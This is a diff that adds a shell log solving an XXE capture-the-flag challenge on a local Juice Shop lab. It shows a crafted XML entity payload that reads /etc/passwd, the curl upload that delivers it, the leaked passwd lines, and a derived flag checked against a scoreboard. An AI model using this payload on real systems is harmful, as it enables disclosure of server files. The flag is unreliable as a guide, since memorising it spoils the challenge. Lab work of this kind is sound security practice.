@@ -1,0 +1,19 @@
+$ cat files/xxe-passwd.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE complaint [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<complaint>&xxe;</complaint>
+
+$ F="file=@files/xxe-passwd.xml;type=text/xml"
+$ curl -s -o /tmp/xxe-response.html -w "HTTP %{http_code}\n" -F "$F" localhost:3000/file-upload
+HTTP 410
+$ grep -o "root:x:[^<]*" /tmp/xxe-response.html | head -1 | sed "s/&lt;.*//"
+root:x:0:0:root:/root:/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/sbin/nologinnonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
+
+$ podman logs pcgctf-juice-shop 2>&1 | grep "Solved.*xxeFileDisclosure"
+info: Solved 3-star xxeFileDisclosureChallenge (XXE Data Access)
+
+$ ./evidence/derive_flag.py 'XXE Data Access'
+pcgCTF{2892edcae3ade1c4faf5c44bc8eb63ed163204b5}
+
+$ curl -s -b /tmp/opencode/cj.txt https://cgcybercom.online/api/v1/challenges/213 | ./evidence/ctfd_status.py
+XXE Data Access | 450 pts | solved_by_me=True
